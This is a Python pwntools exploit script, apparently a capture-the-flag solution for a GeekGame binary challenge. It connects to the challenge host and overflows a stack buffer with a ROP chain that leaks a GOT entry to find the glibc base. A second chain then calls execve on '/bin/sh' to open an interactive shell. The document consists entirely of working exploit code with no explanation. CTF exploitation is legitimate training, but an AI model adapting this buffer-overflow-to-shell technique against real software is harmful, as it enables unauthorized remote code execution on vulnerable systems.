from pwn import *
p=connect("prob05.geekgame.pku.edu.cn",10005)
elf=ELF("./pwn")
libc=ELF("./libc-2.31.so")
puts_got = 0x404018
print(p.recvuntil(':'))
p.sendline("(token)")
print(p.recvline())
print(p.recvline())
p.sendline("10")

payload=('A'*0x88).encode()+p64(0x4013ba)+p64(1)+ p64(2) +p64(0x403FF0) + p64(0) + p64(0)+p64(puts_got)
payload+=p64(0x4013A0)+('A'*0x38).encode()+p64(0x4011CE)
p.sendline(payload)
print(p.recvline())
glibcbase=int.from_bytes(p.recvline(8)[:-1],'little')-0x26fc0
#print(glibcbase)
execve_addr = libc.symbols["execve"] + glibcbase
binsh_addr = next(libc.search("/bin/sh".encode())) + glibcbase
payload=('A'*0x88).encode()+p64(0x26b72+glibcbase)+p64(binsh_addr)+p64(0x27529+glibcbase)
payload+=b'\00'*8+p64(0x162866+glibcbase)+b'\00'*16+p64(execve_addr)
#print(payload)
p.sendline(payload)
p.interactive()
